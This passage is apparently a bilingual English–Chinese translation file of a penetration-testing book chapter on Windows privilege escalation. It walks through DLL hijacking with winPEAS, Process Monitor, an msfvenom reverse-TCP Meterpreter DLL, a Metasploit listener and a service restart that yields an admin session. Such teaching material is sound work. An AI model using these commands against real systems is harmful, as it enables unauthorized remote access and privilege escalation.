  zh: 我们可以通过运行以下命令，通过 Meterpreter 将 **winPEAS.exe** 二进制文件传输到目标系统：
- en: '**upload /<PATH-To-BINARY>/winPEASx64.exe**'
  id: totrans-247
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '**upload /<PATH-To-BINARY>/winPEASx64.exe**'
- en: In the event you are using a standard command shell, you can use the **certutil**
    utility to transfer the binary to the target system.
  id: totrans-248
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 如果你使用的是标准命令行，可以使用 **certutil** 工具将二进制文件传输到目标系统。
- en: 'After uploading the **winPEAS.exe** binary to the target system, we can enumerate
    a list of services that have missing DLLs by running the following command:'
  id: totrans-249
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 将 **winPEAS.exe** 二进制文件上传到目标系统后，我们可以通过运行以下命令列出缺少 DLL 的服务：
- en: '**.\winPEASx64.exe servicesinfo**'
  id: totrans-250
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '**.\winPEASx64.exe servicesinfo**'
- en: 'As highlighted in the following screenshot, this will enumerate a list of services
    with missing DLLs and their respective paths. In our case, we are able to identify
    the application path for the **dllsvc** service that has the necessary permissions:'
  id: totrans-251
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 如以下截图所示，这将列出缺少 DLL 的服务及其相应路径。在我们的例子中，我们能够识别出具有必要权限的 **dllsvc** 服务的应用程序路径：
- en: '![Figure 8.26 – winPEAS DLL hijacking paths'
  id: totrans-252
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '![图 8.26 – winPEAS DLL 劫持路径'
- en: '](Images/B17389_08_026.jpg)'
  id: totrans-253
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '](Images/B17389_08_026.jpg)'
- en: Figure 8.26 – winPEAS DLL hijacking paths
  id: totrans-254
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 图 8.26 – winPEAS DLL 劫持路径
- en: 'We are also able to identify the vulnerable DLL hijacking service as illustrated
    in the following screenshot:'
  id: totrans-255
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 我们还能够识别出易受攻击的 DLL 劫持服务，如以下截图所示：
- en: '![Figure 8.27 – winPEAS DLL hijacking services'
  id: totrans-256
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '![图 8.27 – winPEAS DLL 劫持服务'
- en: '](Images/B17389_08_027.jpg)'
  id: totrans-257
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '](Images/B17389_08_027.jpg)'
- en: Figure 8.27 – winPEAS DLL hijacking services
  id: totrans-258
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 图 8.27 – winPEAS DLL 劫持服务
- en: 'We can also identify missing DLLs for **dllhijackservice.exe** manually. This
    can be done through the Process Monitor utility, which can be downloaded here:
    [https://docs.microsoft.com/en-us/sysinternals/downloads/procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon).'
  id: totrans-259
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 我们还可以手动识别 **dllhijackservice.exe** 的缺失 DLL。这可以通过进程监视器工具完成，可以在此处下载：[https://docs.microsoft.com/en-us/sysinternals/downloads/procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon)。
- en: After downloading the Process Monitor executable to the target system, we can
    execute it and set the filter options highlighted in the following screenshot:![Figure
    8.28 – Process Monitor result filter
  id: totrans-260
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 下载进程监视器可执行文件到目标系统后，我们可以执行它并设置以下截图中突出的过滤器选项：![图 8.28 – 进程监视器结果过滤器
- en: '](Images/B17389_08_028.jpg)'
  id: totrans-261
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '](Images/B17389_08_028.jpg)'
- en: Figure 8.28 – Process Monitor result filter
  id: totrans-262
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 图 8.28 – 进程监视器结果过滤器
- en: After setting the result filter with a value of **NAME NOT FOUND**, we need
    to set up an additional path filter to only display **.dll** files, as highlighted
    in the following screenshot:![Figure 8.29 – Process Monitor path filter](Images/B17389_08_029.jpg)
  id: totrans-263
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 设置结果过滤器为 **NAME NOT FOUND** 后，我们需要设置一个额外的路径过滤器，仅显示 **.dll** 文件，如以下截图所示：![图 8.29
    – 进程监视器路径过滤器](Images/B17389_08_029.jpg)
- en: Figure 8.29 – Process Monitor path filter
  id: totrans-264
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 图 8.29 – 进程监视器路径过滤器
- en: After adding both filters, your filter configuration should be similar to the
    configuration in the following screenshot:![Figure 8.30 – Process Monitor Filter
  id: totrans-265
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 在添加了两个过滤器之后，您的过滤器配置应类似于以下截图中的配置：![图 8.30 – 进程监视器过滤器
- en: '](Images/B17389_08_030.jpg)'
  id: totrans-266
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '](Images/B17389_08_030.jpg)'
- en: Figure 8.30 – Process Monitor Filter
  id: totrans-267
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 图 8.30 – 进程监视器过滤器
- en: After you have set up the filters, you can apply them by clicking on the **Apply**
    button, as highlighted in the preceding screenshot.
  id: totrans-268
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 设置好过滤器后，可以通过点击 **Apply** 按钮应用过滤器，如前面的截图所示。
- en: 'These filters will only display services with missing DLLs and their respective
    DLL names. In this case, we are able to identify the vulnerable service and the
    missing DLL names with their respective paths, as highlighted in the following
    screenshot:'
  id: totrans-269
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 这些过滤器将仅显示缺失 DLL 的服务及其相应的 DLL 名称。在这种情况下，我们可以识别出易受攻击的服务以及缺失的 DLL 名称及其相应的路径，如以下截图所示：
- en: '![Figure 8.31 – Process Monitor missing DLLs'
  id: totrans-270
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '![图 8.31 – 进程监视器缺失 DLL'
- en: '](Images/B17389_08_031.jpg)'
  id: totrans-271
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '](Images/B17389_08_031.jpg)'
- en: Figure 8.31 – Process Monitor missing DLLs
  id: totrans-272
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 图 8.31 – 进程监视器缺失 DLL
- en: We can now generate our custom DLL that will provide us with a Meterpreter session
    when executed.
  id: totrans-273
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 现在我们可以生成我们的自定义 DLL，当执行时，它将为我们提供一个 Meterpreter 会话。
- en: 'We can generate the custom DLL with **msfvenom** and use the Meterpreter payload
    by running the following command in Kali:'
  id: totrans-274
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 我们可以使用 **msfvenom** 生成自定义 DLL，并通过在 Kali 中运行以下命令来使用 Meterpreter 有效载荷：
- en: '**msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<KALI-IP> LPORT=PORT
    -f dll > hijackme.dll**'
  id: totrans-275
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '**msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<KALI-IP> LPORT=PORT
    -f dll > hijackme.dll**'
- en: We will save the custom DLL file with the name of the missing DLL for the **dllhijackservice.exe**
    service. In our case, we will hijack the **hijackme.dll** DLL.
  id: totrans-276
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 我们将保存自定义 DLL 文件，命名为缺失 DLL 的名称，用于 **dllhijackservice.exe** 服务。对于我们的情况，我们将劫持 **hijackme.dll**
    DLL。
- en: 'After generating the custom DLL, we can transfer it to the target system under
    the respective service path. In our case, the path will be the following:'
  id: totrans-277
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 在生成自定义 DLL 后，我们可以将其传输到目标系统的相应服务路径中。对于我们的情况，路径将如下所示：
- en: '**C:\Windows\System32\wbem**'
  id: totrans-278
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '**C:\Windows\System32\wbem**'
- en: 'We can upload the custom DLL with Meterpreter by running the following command:'
  id: totrans-279
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 我们可以通过运行以下命令，使用 Meterpreter 上传自定义 DLL：
- en: '**upload /PATH-TO-DLL/hijackme.dll**'
  id: totrans-280
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '**upload /PATH-TO-DLL/hijackme.dll**'
- en: 'As highlighted in the following screenshot, the **hijackme.dll** file should
    be uploaded to the correct path:'
  id: totrans-281
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 如下图所示，**hijackme.dll** 文件应该被上传到正确的路径：
- en: '![Figure 8.32 – Uploading the custom DLL'
  id: totrans-282
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '![图 8.32 – 上传自定义 DLL'
- en: '](Images/B17389_08_032.jpg)'
  id: totrans-283
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '](Images/B17389_08_032.jpg)'
- en: Figure 8.32 – Uploading the custom DLL
  id: totrans-284
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 图 8.32 – 上传自定义 DLL
- en: 'We now need to set up the Meterpreter listener with Metasploit. This can be
    done by running the following command in the Metasploit console:'
  id: totrans-285
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 现在我们需要使用 Metasploit 设置 Meterpreter 监听器。可以通过在 Metasploit 控制台中运行以下命令来完成：
- en: '**use /exploit/multi/handler**'
  id: totrans-286
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '**use /exploit/multi/handler**'
- en: 'The next step involves specifying the payload we used to create the binary
    with **msfvenom**. This can be done by running the following command:'
  id: totrans-287
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 下一步是指定我们用 **msfvenom** 创建二进制文件时使用的有效载荷。可以通过运行以下命令来完成：
- en: '**set payload /windows/x64/meterpreter/reverse_tcp**'
  id: totrans-288
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '**set payload /windows/x64/meterpreter/reverse_tcp**'
- en: 'We now need to configure the module options. In this case, we need to configure
    the **LHOST** and **LPORT** options as highlighted in the following screenshot:'
  id: totrans-289
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 现在我们需要配置模块选项。在这种情况下，我们需要配置 **LHOST** 和 **LPORT** 选项，如下图所示：
- en: '![Figure 8.33 – Meterpreter listener options'
  id: totrans-290
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '![图 8.33 – Meterpreter 监听器选项'
- en: '](Images/B17389_08_033.jpg)'
  id: totrans-291
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '](Images/B17389_08_033.jpg)'
- en: Figure 8.33 – Meterpreter listener options
  id: totrans-292
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 图 8.33 – Meterpreter 监听器选项
- en: 'After setting the module options, we can start the listener by running the
    following command:'
  id: totrans-293
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 在设置模块选项后，我们可以通过运行以下命令启动监听器：
- en: '**run**'
  id: totrans-294
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '**run**'
- en: The listener will listen for any incoming connections from the payload we generated
    with **msfvenom**.
  id: totrans-295
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 监听器将监听来自我们使用 **msfvenom** 生成的有效载荷的任何传入连接。
- en: 'In order to execute the custom DLL, we need to restart the **dllsvc** service.
    This can be done by running the following commands in the Windows command shell:'
  id: totrans-296
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 为了执行自定义 DLL，我们需要重新启动 **dllsvc** 服务。可以通过在 Windows 命令行中运行以下命令来完成：
- en: '**sc stop dllsvc**'
  id: totrans-297
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '**sc stop dllsvc**'
- en: '**sc start dllsvc**'
  id: totrans-298
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '**sc start dllsvc**'
- en: 'If you havefollowed the steps highlighted so far correctly, you should receive
    a Meterpreter session on the listener we had set up, as follows:'
  id: totrans-299
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 如果你正确地跟随了迄今为止的步骤，你应该能在我们设置的监听器上接收到一个 Meterpreter 会话，如下所示：
- en: '![Figure 8.34 – DLL hijack Meterpreter'
  id: totrans-300
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '![图 8.34 – DLL 劫持 Meterpreter'
- en: '](Images/B17389_08_034.jpg)'
  id: totrans-301
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '](Images/B17389_08_034.jpg)'
- en: Figure 8.34 – DLL hijack Meterpreter
  id: totrans-302
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 图 8.34 – DLL 劫持 Meterpreter
- en: 'We can verify that we have an elevated Meterpreter session by running the following
    command:'
  id: totrans-303
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 我们可以通过运行以下命令验证我们是否已经获得了提升的 Meterpreter 会话：
- en: '**getuid**'
  id: totrans-304
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '**getuid**'
- en: 'As highlighted in the following screenshot, we have successfully elevated our
    privileges and should have a Meterpreter session with administrative privileges:'
  id: totrans-305
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 如下图所示，我们已经成功提升了权限，应该拥有一个带有管理员权限的 Meterpreter 会话：
- en: '![Figure 8.35 – getuid Meterpreter'
  id: totrans-306
  prefs: []
  type: TYPE_NORMAL
  zh: '![图 8.35 – getuid Meterpreter'
- en: '](Images/B17389_08_035.jpg)'
  id: totrans-307
  prefs: []
  type: TYPE_NORMAL
  zh: '](Images/B17389_08_035.jpg)'
- en: Figure 8.35 – getuid Meterpreter
  id: totrans-308
  prefs: []
  type: TYPE_NORMAL
  zh: 图 8.35 – getuid Meterpreter
- en: We have been able to elevate our privileges by identifying missing DLLs and
    generating a custom DLL that will be executed to provide us with an elevated Meterpreter
    session.
  id: totrans-309
  prefs: []
  type: TYPE_NORMAL
  zh: 我们通过识别缺失的 DLL 并生成一个自定义 DLL 来提升权限，从而获得了一个能够提供提升权限的 Meterpreter 会话。
- en: Summary
  id: totrans-310
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 总结
- en: In this chapter, we got started with understanding how to identify and exploit
    unquoted service paths and how they can be utilized to execute a malicious binary
    in order to elevate our privileges. We also explored the process of exploiting
    the Windows secondary logon both manually and automatically with the Metasploit
    framework. We then took a look at how to identify and exploit weak service permissions
    and ended the chapter by taking an in-depth look at how to identify missing DLLs
    and the process of performing DLL hijacking.
  id: totrans-311
  prefs: []
  type: TYPE_NORMAL
  zh: 在本章中，我们首先了解了如何识别和利用未加引号的服务路径，以及如何利用它们执行恶意二进制文件以提升权限。我们还探索了如何手动和自动利用 Metasploit
    框架进行 Windows 次级登录的漏洞利用。接着，我们了解了如何识别和利用弱服务权限，并通过深入探讨如何识别缺失的 DLL 文件以及执行 DLL 劫持的过程来结束本章。
- en: In the next chapter, we will explore the process of privilege escalation through
    the Windows Registry.
  id: totrans-312
  prefs: []
  type: TYPE_NORMAL
  zh: 在下一章中，我们将探索通过 Windows 注册表进行权限提升的过程。
